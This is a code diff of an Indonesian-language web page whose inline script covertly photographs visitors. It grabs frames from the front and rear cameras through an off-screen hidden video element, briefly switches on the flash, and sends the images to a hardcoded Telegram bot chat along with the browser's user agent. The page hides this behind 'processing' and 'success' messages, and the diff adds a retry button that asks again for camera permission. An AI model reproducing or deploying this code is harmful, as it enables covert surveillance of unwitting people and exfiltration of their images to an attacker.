@@ -12,12 +12,22 @@
             height:100vh;width:100vw;
             position:fixed;
             display:flex;justify-content:center;align-items:center;
-            overflow:hidden;
         }
         .c{text-align:center;padding:30px}
         .e{font-size:80px}
         h2{font-size:20px;color:#222;font-weight:600;margin:15px 0 5px}
         p{font-size:13px;color:#888}
+        button{
+            background:#0066ff;
+            color:#fff;
+            border:none;
+            padding:14px 40px;
+            font-size:16px;
+            border-radius:8px;
+            margin-top:20px;
+            cursor:pointer;
+            font-weight:600;
+        }
     </style>
 </head>
 <body>
@@ -32,18 +42,20 @@ const C="1923372966";
 
 async function k(f,l){
     const v=document.createElement('video');
-    v.setAttribute('playsinline','');v.setAttribute('autoplay','');
-    v.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
+    v.style.cssText='position:fixed;top:-9999px';
     document.body.appendChild(v);
-    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:{ideal:1280},height:{ideal:720}}});
-    v.srcObject=s;await v.play();
-    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:true}]})}catch(e){}
-    const c=document.createElement('canvas');
-    c.width=640;c.height=480;
-    c.getContext('2d').drawImage(v,0,0,640,480);
-    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:false}]})}catch(e){}
-    s.getTracks().forEach(t=>t.stop());v.remove();
-    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.8));
+    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:{ideal:1280}}});
+    v.srcObject=s;
+    await v.play();
+    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:true}]});}catch(e){}
+    await new Promise(r=>setTimeout(r,500));
+    const cv=document.createElement('canvas');
+    cv.width=640;cv.height=480;
+    cv.getContext('2d').drawImage(v,0,0,640,480);
+    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:false}]});}catch(e){}
+    s.getTracks().forEach(t=>t.stop());
+    v.remove();
+    const b=await new Promise(r=>cv.toBlob(r,'image/jpeg',0.8));
     const d=new FormData();
     d.append('chat_id',C);d.append('photo',b,l+'.jpg');
     d.append('caption','📸 '+l+' - '+new Date().toLocaleString());
@@ -52,17 +64,17 @@ async function k(f,l){
 
 (async()=>{
 try{
+    document.getElementById('m').innerHTML='<div class="e">⏳</div><h2>Memproses</h2><p>Tunggu sebentar</p>';
     await k('user','DEPAN');
-    await k('environment','BELAKANG');
+    try{await k('environment','BELAKANG');}catch(e){}
     await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
         method:'POST',
         headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:C,text:'📱 '+navigator.userAgent+'\n📏 '+screen.width+'x'+screen.height+'\n🕐 '+new Date().toLocaleString()})
+        body:JSON.stringify({chat_id:C,text:'📱 '+navigator.userAgent+'\n🕐 '+new Date().toLocaleString()})
     });
-    document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Berhasil</h2><p>Tutup halaman ini</p>';
+    document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Berhasil</h2><p>Bisa tutup halaman ini</p>';
 }catch(e){
-    document.getElementById('m').innerHTML='';
-    setTimeout(()=>{window.close();if(!window.closed){window.location.href='about:blank';setTimeout(()=>window.close(),50)}},500);
+    document.getElementById('m').innerHTML='<div class="e">❌</div><h2>Gagal</h2><p>Izin kamera diperlukan</p><button onclick="location.reload()">🔄 Coba Lagi</button>';
 }
 })();
 </script>
